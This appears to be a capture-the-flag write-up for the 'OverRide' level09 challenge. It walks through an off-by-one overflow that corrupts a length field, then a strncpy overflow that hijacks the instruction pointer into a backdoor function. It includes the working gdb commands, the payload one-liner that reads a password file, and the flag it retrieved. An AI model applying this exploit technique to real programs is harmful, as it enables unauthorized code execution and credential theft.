# In set_username, we can overflow username[40] to write 1 byte in msg_len
# username is 40 bytes long but the loop is filling 41 char

# since set_msg strncpy with data.msg_len we altered before, an overflow can occur
# The overflow is only 1 byte, our max value for msg_len will be 0xff (255)
# We can overwrite EIP since data.message is only 140 bytes long

(gdb) r < <(python -c 'print "A"*40+"\x88"' ; python -c 'print "B"*50')
Breakpoint 4, 0x00005555555549c6 in set_msg () # Breakpoint at strncpy call
(gdb) info reg
[...]
rdx            0x88	136
[...]
# char *strncpy(char *dest, const char *src, size_t n);
# we altered n so it means that we can overflow the strncpy

(gdb) r < <(python -c 'print "A"*40+"\xff"' ; python -c 'print "\xff"*210')
[...]
0xffffffffffffffff in ?? ()
[...]

# We can control EIP at 200 char in the second arg

====================================================================================

# This way, we can redirect the execution to secret_backdoor

(gdb) info func secret_backdoor
0x000055555555488c  secret_backdoor

level09@OverRide:~$ (python -c 'print "A"*40+"\xff"' ; python -c 'print "\xff"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"' ; python -c 'print "cat /home/users/end/.pass"') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
